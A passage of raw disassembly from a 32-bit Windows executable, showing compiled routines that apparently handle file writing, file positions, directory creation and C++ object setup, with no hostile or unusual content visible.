  402459:	89 44 24 24          	mov    %eax,0x24(%esp)
  40245d:	89 74 24 28          	mov    %esi,0x28(%esp)
  402461:	e9 d3 fe ff ff       	jmp    0x402339
  402466:	c6 47 25 01          	movb   $0x1,0x25(%edi)
  40246a:	33 c0                	xor    %eax,%eax
  40246c:	eb 0f                	jmp    0x40247d
  40246e:	85 ed                	test   %ebp,%ebp
  402470:	7e 09                	jle    0x40247b
  402472:	8b c5                	mov    %ebp,%eax
  402474:	99                   	cltd
  402475:	01 47 28             	add    %eax,0x28(%edi)
  402478:	11 57 2c             	adc    %edx,0x2c(%edi)
  40247b:	8b c5                	mov    %ebp,%eax
  40247d:	5b                   	pop    %ebx
  40247e:	5d                   	pop    %ebp
  40247f:	5e                   	pop    %esi
  402480:	5f                   	pop    %edi
  402481:	83 c4 10             	add    $0x10,%esp
  402484:	c2 08 00             	ret    $0x8
  402487:	cc                   	int3
  402488:	cc                   	int3
  402489:	cc                   	int3
  40248a:	cc                   	int3
  40248b:	cc                   	int3
  40248c:	cc                   	int3
  40248d:	cc                   	int3
  40248e:	cc                   	int3
  40248f:	cc                   	int3
  402490:	56                   	push   %esi
  402491:	ff 74 24 10          	push   0x10(%esp)
  402495:	8b f1                	mov    %ecx,%esi
  402497:	ff 74 24 10          	push   0x10(%esp)
  40249b:	ff 74 24 10          	push   0x10(%esp)
  40249f:	e8 93 fc ff ff       	call   0x402137
  4024a4:	84 c0                	test   %al,%al
  4024a6:	75 13                	jne    0x4024bb
  4024a8:	38 46 1e             	cmp    %al,0x1e(%esi)
  4024ab:	74 0e                	je     0x4024bb
  4024ad:	8d 46 32             	lea    0x32(%esi),%eax
  4024b0:	b9 ac bd 45 00       	mov    $0x45bdac,%ecx
  4024b5:	50                   	push   %eax
  4024b6:	e8 66 f5 ff ff       	call   0x401a21
  4024bb:	5e                   	pop    %esi
  4024bc:	c2 0c 00             	ret    $0xc
  4024bf:	c2 08 00             	ret    $0x8
  4024c2:	83 ec 1c             	sub    $0x1c,%esp
  4024c5:	53                   	push   %ebx
  4024c6:	55                   	push   %ebp
  4024c7:	57                   	push   %edi
  4024c8:	8b f9                	mov    %ecx,%edi
  4024ca:	81 7f 20 00 01 00 00 	cmpl   $0x100,0x20(%edi)
  4024d1:	74 0f                	je     0x4024e2
  4024d3:	f6 47 20 02          	testb  $0x2,0x20(%edi)
  4024d7:	75 09                	jne    0x4024e2
  4024d9:	ff 77 08             	push   0x8(%edi)
  4024dc:	ff 15 1c a0 42 00    	call   *0x42a01c
  4024e2:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4024e6:	33 db                	xor    %ebx,%ebx
  4024e8:	43                   	inc    %ebx
  4024e9:	85 c9                	test   %ecx,%ecx
  4024eb:	74 0f                	je     0x4024fc
  4024ed:	8b 01                	mov    (%ecx),%eax
  4024ef:	0b 41 04             	or     0x4(%ecx),%eax
  4024f2:	74 08                	je     0x4024fc
  4024f4:	8a d3                	mov    %bl,%dl
  4024f6:	88 5c 24 0f          	mov    %bl,0xf(%esp)
  4024fa:	eb 06                	jmp    0x402502
  4024fc:	32 d2                	xor    %dl,%dl
  4024fe:	88 54 24 0f          	mov    %dl,0xf(%esp)
  402502:	56                   	push   %esi
  402503:	8b 74 24 34          	mov    0x34(%esp),%esi
  402507:	85 f6                	test   %esi,%esi
  402509:	74 0b                	je     0x402516
  40250b:	8b 06                	mov    (%esi),%eax
  40250d:	0b 46 04             	or     0x4(%esi),%eax
  402510:	88 5c 24 12          	mov    %bl,0x12(%esp)
  402514:	75 05                	jne    0x40251b
  402516:	c6 44 24 12 00       	movb   $0x0,0x12(%esp)
  40251b:	8b 6c 24 38          	mov    0x38(%esp),%ebp
  40251f:	85 ed                	test   %ebp,%ebp
  402521:	74 08                	je     0x40252b
  402523:	8b 45 00             	mov    0x0(%ebp),%eax
  402526:	0b 45 04             	or     0x4(%ebp),%eax
  402529:	75 02                	jne    0x40252d
  40252b:	32 db                	xor    %bl,%bl
  40252d:	84 d2                	test   %dl,%dl
  40252f:	74 0a                	je     0x40253b
  402531:	8d 44 24 14          	lea    0x14(%esp),%eax
  402535:	50                   	push   %eax
  402536:	e8 f3 53 00 00       	call   0x40792e
  40253b:	80 7c 24 12 00       	cmpb   $0x0,0x12(%esp)
  402540:	74 0c                	je     0x40254e
  402542:	8d 44 24 24          	lea    0x24(%esp),%eax
  402546:	8b ce                	mov    %esi,%ecx
  402548:	50                   	push   %eax
  402549:	e8 e0 53 00 00       	call   0x40792e
  40254e:	5e                   	pop    %esi
  40254f:	84 db                	test   %bl,%bl
  402551:	74 0c                	je     0x40255f
  402553:	8d 44 24 18          	lea    0x18(%esp),%eax
  402557:	8b cd                	mov    %ebp,%ecx
  402559:	50                   	push   %eax
  40255a:	e8 cf 53 00 00       	call   0x40792e
  40255f:	0f b6 44 24 0f       	movzbl 0xf(%esp),%eax
  402564:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402568:	f7 d8                	neg    %eax
  40256a:	1b c0                	sbb    %eax,%eax
  40256c:	23 c1                	and    %ecx,%eax
  40256e:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  402572:	50                   	push   %eax
  402573:	0f b6 c3             	movzbl %bl,%eax
  402576:	f7 d8                	neg    %eax
  402578:	1b c0                	sbb    %eax,%eax
  40257a:	23 c1                	and    %ecx,%eax
  40257c:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  402580:	50                   	push   %eax
  402581:	0f b6 44 24 16       	movzbl 0x16(%esp),%eax
  402586:	f7 d8                	neg    %eax
  402588:	1b c0                	sbb    %eax,%eax
  40258a:	23 c1                	and    %ecx,%eax
  40258c:	50                   	push   %eax
  40258d:	ff 77 08             	push   0x8(%edi)
  402590:	ff 15 28 a0 42 00    	call   *0x42a028
  402596:	5f                   	pop    %edi
  402597:	5d                   	pop    %ebp
  402598:	5b                   	pop    %ebx
  402599:	83 c4 1c             	add    $0x1c,%esp
  40259c:	c2 0c 00             	ret    $0xc
  40259f:	cc                   	int3
  4025a0:	55                   	push   %ebp
  4025a1:	8b ec                	mov    %esp,%ebp
  4025a3:	51                   	push   %ecx
  4025a4:	53                   	push   %ebx
  4025a5:	56                   	push   %esi
  4025a6:	8b f1                	mov    %ecx,%esi
  4025a8:	57                   	push   %edi
  4025a9:	83 7e 08 ff          	cmpl   $0xffffffff,0x8(%esi)
  4025ad:	8d 7e 1e             	lea    0x1e(%esi),%edi
  4025b0:	75 15                	jne    0x4025c7
  4025b2:	80 3f 00             	cmpb   $0x0,(%edi)
  4025b5:	74 6b                	je     0x402622
  4025b7:	8d 5e 32             	lea    0x32(%esi),%ebx
  4025ba:	b9 ac bd 45 00       	mov    $0x45bdac,%ecx
  4025bf:	53                   	push   %ebx
  4025c0:	e8 5c f4 ff ff       	call   0x401a21
  4025c5:	eb 03                	jmp    0x4025ca
  4025c7:	8d 5e 32             	lea    0x32(%esi),%ebx
  4025ca:	83 7e 10 01          	cmpl   $0x1,0x10(%esi)
  4025ce:	75 08                	jne    0x4025d8
  4025d0:	8b 46 28             	mov    0x28(%esi),%eax
  4025d3:	8b 56 2c             	mov    0x2c(%esi),%edx
  4025d6:	eb 45                	jmp    0x40261d
  4025d8:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4025dc:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4025df:	6a 01                	push   $0x1
  4025e1:	50                   	push   %eax
  4025e2:	6a 00                	push   $0x0
  4025e4:	ff 76 08             	push   0x8(%esi)
  4025e7:	ff 15 24 a0 42 00    	call   *0x42a024
  4025ed:	8b f0                	mov    %eax,%esi
  4025ef:	83 fe ff             	cmp    $0xffffffff,%esi
  4025f2:	75 1a                	jne    0x40260e
  4025f4:	ff 15 00 a0 42 00    	call   *0x42a000
  4025fa:	85 c0                	test   %eax,%eax
  4025fc:	74 10                	je     0x40260e
  4025fe:	80 3f 00             	cmpb   $0x0,(%edi)
  402601:	74 1f                	je     0x402622
  402603:	53                   	push   %ebx
  402604:	b9 ac bd 45 00       	mov    $0x45bdac,%ecx
  402609:	e8 13 f4 ff ff       	call   0x401a21
  40260e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402611:	33 c9                	xor    %ecx,%ecx
  402613:	99                   	cltd
  402614:	03 ce                	add    %esi,%ecx
  402616:	8b d0                	mov    %eax,%edx
  402618:	8b c1                	mov    %ecx,%eax
  40261a:	83 d2 00             	adc    $0x0,%edx
  40261d:	5f                   	pop    %edi
  40261e:	5e                   	pop    %esi
  40261f:	5b                   	pop    %ebx
  402620:	c9                   	leave
  402621:	c3                   	ret
  402622:	83 c8 ff             	or     $0xffffffff,%eax
  402625:	0b d0                	or     %eax,%edx
  402627:	eb f4                	jmp    0x40261d
  402629:	ff 71 08             	push   0x8(%ecx)
  40262c:	ff 15 20 a0 42 00    	call   *0x42a020
  402632:	48                   	dec    %eax
  402633:	f7 d8                	neg    %eax
  402635:	1a c0                	sbb    %al,%al
  402637:	fe c0                	inc    %al
  402639:	c3                   	ret
  40263a:	51                   	push   %ecx
  40263b:	51                   	push   %ecx
  40263c:	55                   	push   %ebp
  40263d:	56                   	push   %esi
  40263e:	8b 74 24 18          	mov    0x18(%esp),%esi
  402642:	8b e9                	mov    %ecx,%ebp
  402644:	85 f6                	test   %esi,%esi
  402646:	75 07                	jne    0x40264f
  402648:	b0 01                	mov    $0x1,%al
  40264a:	e9 1b 01 00 00       	jmp    0x40276a
  40264f:	83 7d 10 01          	cmpl   $0x1,0x10(%ebp)
  402653:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402656:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  40265a:	75 0f                	jne    0x40266b
  40265c:	6a f5                	push   $0xfffffff5
  40265e:	ff 15 10 a0 42 00    	call   *0x42a010
  402664:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402667:	89 01                	mov    %eax,(%ecx)
  402669:	eb 04                	jmp    0x40266f
  40266b:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  40266f:	53                   	push   %ebx
  402670:	57                   	push   %edi
  402671:	83 64 24 10 00       	andl   $0x0,0x10(%esp)
  402676:	32 db                	xor    %bl,%bl
  402678:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40267c:	74 45                	je     0x4026c3
  40267e:	33 ff                	xor    %edi,%edi
  402680:	85 f6                	test   %esi,%esi
  402682:	74 60                	je     0x4026e4
  402684:	8b c6                	mov    %esi,%eax
  402686:	2b c7                	sub    %edi,%eax
  402688:	3d 00 40 00 00       	cmp    $0x4000,%eax
  40268d:	72 05                	jb     0x402694
  40268f:	b8 00 40 00 00       	mov    $0x4000,%eax
  402694:	6a 00                	push   $0x0
  402696:	8d 54 24 14          	lea    0x14(%esp),%edx
  40269a:	52                   	push   %edx
  40269b:	50                   	push   %eax
  40269c:	8b 44 24 28          	mov    0x28(%esp),%eax
  4026a0:	03 c7                	add    %edi,%eax
  4026a2:	50                   	push   %eax
  4026a3:	ff 31                	push   (%ecx)
  4026a5:	ff 15 14 a0 42 00    	call   *0x42a014
  4026ab:	83 f8 01             	cmp    $0x1,%eax
  4026ae:	0f 94 c3             	sete   %bl
  4026b1:	75 2d                	jne    0x4026e0
  4026b3:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4026b7:	81 c7 00 40 00 00    	add    $0x4000,%edi
  4026bd:	3b fe                	cmp    %esi,%edi
  4026bf:	72 c3                	jb     0x402684
  4026c1:	eb 1d                	jmp    0x4026e0
  4026c3:	6a 00                	push   $0x0
  4026c5:	8d 44 24 14          	lea    0x14(%esp),%eax
  4026c9:	50                   	push   %eax
  4026ca:	56                   	push   %esi
  4026cb:	ff 74 24 28          	push   0x28(%esp)
  4026cf:	ff 31                	push   (%ecx)
  4026d1:	ff 15 14 a0 42 00    	call   *0x42a014
  4026d7:	8d 58 ff             	lea    -0x1(%eax),%ebx
  4026da:	f7 db                	neg    %ebx
  4026dc:	1a db                	sbb    %bl,%bl
  4026de:	fe c3                	inc    %bl
  4026e0:	84 db                	test   %bl,%bl
  4026e2:	75 7e                	jne    0x402762
  4026e4:	80 7d 1e 00          	cmpb   $0x0,0x1e(%ebp)
  4026e8:	74 78                	je     0x402762
  4026ea:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4026ee:	75 72                	jne    0x402762
  4026f0:	6a 00                	push   $0x0
  4026f2:	8d 7d 32             	lea    0x32(%ebp),%edi
  4026f5:	b9 ac bd 45 00       	mov    $0x45bdac,%ecx
  4026fa:	57                   	push   %edi
  4026fb:	e8 67 f1 ff ff       	call   0x401867
  402700:	84 c0                	test   %al,%al
  402702:	74 51                	je     0x402755
  402704:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402708:	39 74 24 10          	cmp    %esi,0x10(%esp)
  40270c:	0f 83 5f ff ff ff    	jae    0x402671
  402712:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  402717:	0f 86 54 ff ff ff    	jbe    0x402671
  40271d:	8b 7d 00             	mov    0x0(%ebp),%edi
  402720:	6a 00                	push   $0x0
  402722:	8b 77 14             	mov    0x14(%edi),%esi
  402725:	8b ce                	mov    %esi,%ecx
  402727:	ff 15 30 a2 42 00    	call   *0x42a230
  40272d:	8b cd                	mov    %ebp,%ecx
  40272f:	ff d6                	call   *%esi
  402731:	2b 44 24 14          	sub    0x14(%esp),%eax
  402735:	8b 4f 10             	mov    0x10(%edi),%ecx
  402738:	83 da 00             	sbb    $0x0,%edx
  40273b:	52                   	push   %edx
  40273c:	50                   	push   %eax
  40273d:	ff 15 30 a2 42 00    	call   *0x42a230
  402743:	8b cd                	mov    %ebp,%ecx
  402745:	ff 57 10             	call   *0x10(%edi)
  402748:	8b 74 24 20          	mov    0x20(%esp),%esi
  40274c:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402750:	e9 1c ff ff ff       	jmp    0x402671
  402755:	57                   	push   %edi
  402756:	6a 00                	push   $0x0
  402758:	b9 ac bd 45 00       	mov    $0x45bdac,%ecx
  40275d:	e8 2c f4 ff ff       	call   0x401b8e
  402762:	5f                   	pop    %edi
  402763:	8a c3                	mov    %bl,%al
  402765:	c6 45 0c 01          	movb   $0x1,0xc(%ebp)
  402769:	5b                   	pop    %ebx
  40276a:	5e                   	pop    %esi
  40276b:	5d                   	pop    %ebp
  40276c:	59                   	pop    %ecx
  40276d:	59                   	pop    %ecx
  40276e:	c2 08 00             	ret    $0x8
  402771:	8b 44 24 04          	mov    0x4(%esp),%eax
  402775:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40277a:	72 08                	jb     0x402784
  40277c:	50                   	push   %eax
  40277d:	e8 14 00 00 00       	call   0x402796
  402782:	eb 0f                	jmp    0x402793
  402784:	85 c0                	test   %eax,%eax
  402786:	74 09                	je     0x402791
  402788:	50                   	push   %eax
  402789:	e8 c5 3e 01 00       	call   0x416653
  40278e:	59                   	pop    %ecx
  40278f:	eb 02                	jmp    0x402793
  402791:	33 c0                	xor    %eax,%eax
  402793:	c2 04 00             	ret    $0x4
  402796:	8b 44 24 04          	mov    0x4(%esp),%eax
  40279a:	8d 48 23             	lea    0x23(%eax),%ecx
  40279d:	3b c8                	cmp    %eax,%ecx
  40279f:	76 1e                	jbe    0x4027bf
  4027a1:	51                   	push   %ecx
  4027a2:	e8 ac 3e 01 00       	call   0x416653
  4027a7:	59                   	pop    %ecx
  4027a8:	8b c8                	mov    %eax,%ecx
  4027aa:	85 c9                	test   %ecx,%ecx
  4027ac:	74 0c                	je     0x4027ba
  4027ae:	8d 41 23             	lea    0x23(%ecx),%eax
  4027b1:	83 e0 e0             	and    $0xffffffe0,%eax
  4027b4:	89 48 fc             	mov    %ecx,-0x4(%eax)
  4027b7:	c2 04 00             	ret    $0x4
  4027ba:	e8 9a 8c 01 00       	call   0x41b459
  4027bf:	e8 5c 08 00 00       	call   0x403020
  4027c4:	cc                   	int3
  4027c5:	8b 44 24 04          	mov    0x4(%esp),%eax
  4027c9:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4027ce:	77 05                	ja     0x4027d5
  4027d0:	03 c0                	add    %eax,%eax
  4027d2:	c2 04 00             	ret    $0x4
  4027d5:	e8 46 08 00 00       	call   0x403020
  4027da:	cc                   	int3
  4027db:	51                   	push   %ecx
  4027dc:	53                   	push   %ebx
  4027dd:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4027e1:	57                   	push   %edi
  4027e2:	8b f9                	mov    %ecx,%edi
  4027e4:	b9 fe ff ff 7f       	mov    $0x7ffffffe,%ecx
  4027e9:	3b d9                	cmp    %ecx,%ebx
  4027eb:	77 60                	ja     0x40284d
  4027ed:	8b 47 14             	mov    0x14(%edi),%eax
  4027f0:	55                   	push   %ebp
  4027f1:	56                   	push   %esi
  4027f2:	51                   	push   %ecx
  4027f3:	50                   	push   %eax
  4027f4:	53                   	push   %ebx
  4027f5:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4027f9:	e8 f0 07 00 00       	call   0x402fee
  4027fe:	8b f0                	mov    %eax,%esi
  402800:	8d 4e 01             	lea    0x1(%esi),%ecx
  402803:	51                   	push   %ecx
  402804:	e8 bc ff ff ff       	call   0x4027c5
  402809:	50                   	push   %eax
  40280a:	e8 62 ff ff ff       	call   0x402771
  40280f:	53                   	push   %ebx
  402810:	ff 74 24 24          	push   0x24(%esp)
  402814:	8b e8                	mov    %eax,%ebp
  402816:	89 5f 10             	mov    %ebx,0x10(%edi)
  402819:	55                   	push   %ebp
  40281a:	89 77 14             	mov    %esi,0x14(%edi)
  40281d:	e8 6f 08 00 00       	call   0x403091
  402822:	33 c0                	xor    %eax,%eax
  402824:	66 89 44 5d 00       	mov    %ax,0x0(%ebp,%ebx,2)
  402829:	8b 44 24 10          	mov    0x10(%esp),%eax
  40282d:	83 f8 08             	cmp    $0x8,%eax
  402830:	72 0f                	jb     0x402841
  402832:	8d 04 45 02 00 00 00 	lea    0x2(,%eax,2),%eax
  402839:	50                   	push   %eax
  40283a:	ff 37                	push   (%edi)
  40283c:	e8 2a ea ff ff       	call   0x40126b
  402841:	5e                   	pop    %esi
  402842:	89 2f                	mov    %ebp,(%edi)
  402844:	8b c7                	mov    %edi,%eax
  402846:	5d                   	pop    %ebp
  402847:	5f                   	pop    %edi
  402848:	5b                   	pop    %ebx
  402849:	59                   	pop    %ecx
  40284a:	c2 0c 00             	ret    $0xc
  40284d:	e8 eb 07 00 00       	call   0x40303d
  402852:	cc                   	int3
  402853:	cc                   	int3
  402854:	cc                   	int3
  402855:	cc                   	int3
  402856:	cc                   	int3
  402857:	cc                   	int3
  402858:	cc                   	int3
  402859:	cc                   	int3
  40285a:	cc                   	int3
  40285b:	cc                   	int3
  40285c:	cc                   	int3
  40285d:	cc                   	int3
  40285e:	cc                   	int3
  40285f:	cc                   	int3
  402860:	56                   	push   %esi
  402861:	ff 74 24 08          	push   0x8(%esp)
  402865:	8b f1                	mov    %ecx,%esi
  402867:	e8 44 00 00 00       	call   0x4028b0
  40286c:	c7 06 e0 c2 42 00    	movl   $0x42c2e0,(%esi)
  402872:	8b c6                	mov    %esi,%eax
  402874:	5e                   	pop    %esi
  402875:	c2 04 00             	ret    $0x4
  402878:	cc                   	int3
  402879:	cc                   	int3
  40287a:	cc                   	int3
  40287b:	cc                   	int3
  40287c:	cc                   	int3
  40287d:	cc                   	int3
  40287e:	cc                   	int3
  40287f:	cc                   	int3
  402880:	56                   	push   %esi
  402881:	ff 74 24 08          	push   0x8(%esp)
  402885:	8b f1                	mov    %ecx,%esi
  402887:	e8 24 00 00 00       	call   0x4028b0
  40288c:	c7 06 04 c4 42 00    	movl   $0x42c404,(%esi)
  402892:	8b c6                	mov    %esi,%eax
  402894:	5e                   	pop    %esi
  402895:	c2 04 00             	ret    $0x4
  402898:	83 61 04 00          	andl   $0x0,0x4(%ecx)
  40289c:	8b c1                	mov    %ecx,%eax
  40289e:	83 61 08 00          	andl   $0x0,0x8(%ecx)
  4028a2:	c7 41 04 b8 a5 42 00 	movl   $0x42a5b8,0x4(%ecx)
  4028a9:	c7 01 04 c4 42 00    	movl   $0x42c404,(%ecx)
  4028af:	c3                   	ret
  4028b0:	56                   	push   %esi
  4028b1:	8b f1                	mov    %ecx,%esi
  4028b3:	8d 46 04             	lea    0x4(%esi),%eax
  4028b6:	c7 06 d4 c2 42 00    	movl   $0x42c2d4,(%esi)
  4028bc:	83 20 00             	andl   $0x0,(%eax)
  4028bf:	83 60 04 00          	andl   $0x0,0x4(%eax)
  4028c3:	50                   	push   %eax
  4028c4:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4028c8:	83 c0 04             	add    $0x4,%eax
  4028cb:	50                   	push   %eax
  4028cc:	e8 eb 53 01 00       	call   0x417cbc
  4028d1:	59                   	pop    %ecx
  4028d2:	59                   	pop    %ecx
  4028d3:	8b c6                	mov    %esi,%eax
  4028d5:	5e                   	pop    %esi
  4028d6:	c2 04 00             	ret    $0x4
  4028d9:	cc                   	int3
  4028da:	cc                   	int3
  4028db:	cc                   	int3
  4028dc:	cc                   	int3
  4028dd:	cc                   	int3
  4028de:	cc                   	int3
  4028df:	cc                   	int3
  4028e0:	8d 41 04             	lea    0x4(%ecx),%eax
  4028e3:	c7 01 d4 c2 42 00    	movl   $0x42c2d4,(%ecx)
  4028e9:	50                   	push   %eax
  4028ea:	e8 30 54 01 00       	call   0x417d1f
  4028ef:	59                   	pop    %ecx
  4028f0:	c3                   	ret
  4028f1:	cc                   	int3
  4028f2:	cc                   	int3
  4028f3:	cc                   	int3
  4028f4:	cc                   	int3
  4028f5:	cc                   	int3
  4028f6:	cc                   	int3
  4028f7:	cc                   	int3
  4028f8:	cc                   	int3
  4028f9:	cc                   	int3
  4028fa:	cc                   	int3
  4028fb:	cc                   	int3
  4028fc:	cc                   	int3
  4028fd:	cc                   	int3
  4028fe:	cc                   	int3
  4028ff:	cc                   	int3
  402900:	56                   	push   %esi
  402901:	8b f1                	mov    %ecx,%esi
  402903:	8d 46 04             	lea    0x4(%esi),%eax
  402906:	c7 06 d4 c2 42 00    	movl   $0x42c2d4,(%esi)
  40290c:	50                   	push   %eax
  40290d:	e8 0d 54 01 00       	call   0x417d1f
  402912:	f6 44 24 0c 01       	testb  $0x1,0xc(%esp)
  402917:	59                   	pop    %ecx
  402918:	74 0a                	je     0x402924
  40291a:	6a 0c                	push   $0xc
  40291c:	56                   	push   %esi
  40291d:	e8 45 3c 01 00       	call   0x416567
  402922:	59                   	pop    %ecx
  402923:	59                   	pop    %ecx
  402924:	8b c6                	mov    %esi,%eax
  402926:	5e                   	pop    %esi
  402927:	c2 04 00             	ret    $0x4
  40292a:	b8 08 10 00 00       	mov    $0x1008,%eax
  40292f:	e8 cc 3c 01 00       	call   0x416600
  402934:	a1 5c 56 43 00       	mov    0x43565c,%eax
  402939:	33 c4                	xor    %esp,%eax
  40293b:	89 84 24 04 10 00 00 	mov    %eax,0x1004(%esp)
  402942:	53                   	push   %ebx
  402943:	55                   	push   %ebp
  402944:	56                   	push   %esi
  402945:	8b b4 24 18 10 00 00 	mov    0x1018(%esp),%esi
  40294c:	57                   	push   %edi
  40294d:	85 f6                	test   %esi,%esi
  40294f:	0f 84 c0 00 00 00    	je     0x402a15
  402955:	33 c0                	xor    %eax,%eax
  402957:	66 39 06             	cmp    %ax,(%esi)
  40295a:	0f 84 b5 00 00 00    	je     0x402a15
  402960:	b3 01                	mov    $0x1,%bl
  402962:	89 44 24 10          	mov    %eax,0x10(%esp)
  402966:	8b fe                	mov    %esi,%edi
  402968:	8b e8                	mov    %eax,%ebp
  40296a:	d1 fd                	sar    $1,%ebp
  40296c:	81 fd 00 08 00 00    	cmp    $0x800,%ebp
  402972:	73 6d                	jae    0x4029e1
  402974:	0f b7 07             	movzwl (%edi),%eax
  402977:	50                   	push   %eax
  402978:	e8 36 15 00 00       	call   0x403eb3
  40297d:	84 c0                	test   %al,%al
  40297f:	74 4b                	je     0x4029cc
  402981:	3b fe                	cmp    %esi,%edi
  402983:	76 47                	jbe    0x4029cc
  402985:	8d 46 04             	lea    0x4(%esi),%eax
  402988:	3b f8                	cmp    %eax,%edi
  40298a:	75 07                	jne    0x402993
  40298c:	66 83 7e 02 3a       	cmpw   $0x3a,0x2(%esi)
  402991:	74 39                	je     0x4029cc
  402993:	55                   	push   %ebp
  402994:	8d 44 24 18          	lea    0x18(%esp),%eax
  402998:	56                   	push   %esi
  402999:	50                   	push   %eax
  40299a:	e8 66 ac 01 00       	call   0x41d605
  40299f:	03 ed                	add    %ebp,%ebp
  4029a1:	83 c4 0c             	add    $0xc,%esp
  4029a4:	81 fd 00 10 00 00    	cmp    $0x1000,%ebp
  4029aa:	0f 83 82 00 00 00    	jae    0x402a32
  4029b0:	33 c0                	xor    %eax,%eax
  4029b2:	50                   	push   %eax
  4029b3:	66 89 44 2c 18       	mov    %ax,0x18(%esp,%ebp,1)
  4029b8:	8d 44 24 18          	lea    0x18(%esp),%eax
  4029bc:	6a 01                	push   $0x1
  4029be:	50                   	push   %eax
  4029bf:	e8 65 03 00 00       	call   0x402d29
  4029c4:	8b d8                	mov    %eax,%ebx
  4029c6:	f7 db                	neg    %ebx
  4029c8:	1a db                	sbb    %bl,%bl
  4029ca:	fe c3                	inc    %bl
  4029cc:	8b 44 24 10          	mov    0x10(%esp),%eax
  4029d0:	83 c7 02             	add    $0x2,%edi
  4029d3:	83 c0 02             	add    $0x2,%eax
  4029d6:	33 c9                	xor    %ecx,%ecx
  4029d8:	89 44 24 10          	mov    %eax,0x10(%esp)
  4029dc:	66 39 0f             	cmp    %cx,(%edi)
  4029df:	75 87                	jne    0x402968
  4029e1:	80 bc 24 20 10 00 00 	cmpb   $0x0,0x1020(%esp)
  4029e8:	00 
  4029e9:	75 26                	jne    0x402a11
  4029eb:	56                   	push   %esi
  4029ec:	e8 1c 16 00 00       	call   0x40400d
  4029f1:	0f b7 00             	movzwl (%eax),%eax
  4029f4:	50                   	push   %eax
  4029f5:	e8 b9 14 00 00       	call   0x403eb3
  4029fa:	84 c0                	test   %al,%al
  4029fc:	75 13                	jne    0x402a11
  4029fe:	33 c0                	xor    %eax,%eax
  402a00:	50                   	push   %eax
  402a01:	6a 01                	push   $0x1
  402a03:	56                   	push   %esi
  402a04:	e8 20 03 00 00       	call   0x402d29
  402a09:	f7 d8                	neg    %eax
  402a0b:	1a c0                	sbb    %al,%al
  402a0d:	fe c0                	inc    %al
  402a0f:	8a d8                	mov    %al,%bl
  402a11:	8a c3                	mov    %bl,%al
  402a13:	eb 02                	jmp    0x402a17
  402a15:	32 c0                	xor    %al,%al
  402a17:	8b 8c 24 14 10 00 00 	mov    0x1014(%esp),%ecx
  402a1e:	5f                   	pop    %edi
  402a1f:	5e                   	pop    %esi
  402a20:	5d                   	pop    %ebp
  402a21:	5b                   	pop    %ebx
  402a22:	33 cc                	xor    %esp,%ecx
  402a24:	e8 30 3b 01 00       	call   0x416559
  402a29:	81 c4 08 10 00 00    	add    $0x1008,%esp
  402a2f:	c2 0c 00             	ret    $0xc
  402a32:	e8 6e 3d 01 00       	call   0x4167a5
  402a37:	cc                   	int3
  402a38:	55                   	push   %ebp
  402a39:	8b ec                	mov    %esp,%ebp
  402a3b:	b8 04 10 00 00       	mov    $0x1004,%eax
  402a40:	e8 bb 3b 01 00       	call   0x416600
  402a45:	a1 5c 56 43 00       	mov    0x43565c,%eax
  402a4a:	33 c5                	xor    %ebp,%eax
  402a4c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402a4f:	53                   	push   %ebx
  402a50:	56                   	push   %esi
  402a51:	8b 75 08             	mov    0x8(%ebp),%esi
  402a54:	56                   	push   %esi
  402a55:	ff 15 3c a0 42 00    	call   *0x42a03c
  402a5b:	85 c0                	test   %eax,%eax
  402a5d:	0f 95 c3             	setne  %bl
  402a60:	85 c0                	test   %eax,%eax
  402a62:	75 28                	jne    0x402a8c
  402a64:	68 00 08 00 00       	push   $0x800
  402a69:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  402a6f:	50                   	push   %eax
  402a70:	56                   	push   %esi
  402a71:	e8 27 12 00 00       	call   0x403c9d
  402a76:	84 c0                	test   %al,%al
  402a78:	74 12                	je     0x402a8c
  402a7a:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  402a80:	50                   	push   %eax
  402a81:	ff 15 3c a0 42 00    	call   *0x42a03c
  402a87:	85 c0                	test   %eax,%eax
  402a89:	0f 95 c3             	setne  %bl
  402a8c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402a8f:	8a c3                	mov    %bl,%al
  402a91:	5e                   	pop    %esi
  402a92:	33 cd                	xor    %ebp,%ecx
  402a94:	5b                   	pop    %ebx
  402a95:	e8 bf 3a 01 00       	call   0x416559
  402a9a:	c9                   	leave
  402a9b:	c2 04 00             	ret    $0x4
  402a9e:	55                   	push   %ebp
  402a9f:	8b ec                	mov    %esp,%ebp
  402aa1:	b8 04 10 00 00       	mov    $0x1004,%eax
  402aa6:	e8 55 3b 01 00       	call   0x416600
  402aab:	a1 5c 56 43 00       	mov    0x43565c,%eax
  402ab0:	33 c5                	xor    %ebp,%eax
  402ab2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402ab5:	53                   	push   %ebx
  402ab6:	56                   	push   %esi
  402ab7:	8b 75 08             	mov    0x8(%ebp),%esi
  402aba:	56                   	push   %esi
  402abb:	ff 15 48 a0 42 00    	call   *0x42a048
  402ac1:	85 c0                	test   %eax,%eax
  402ac3:	0f 95 c3             	setne  %bl
  402ac6:	85 c0                	test   %eax,%eax
  402ac8:	75 28                	jne    0x402af2
  402aca:	68 00 08 00 00       	push   $0x800
  402acf:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
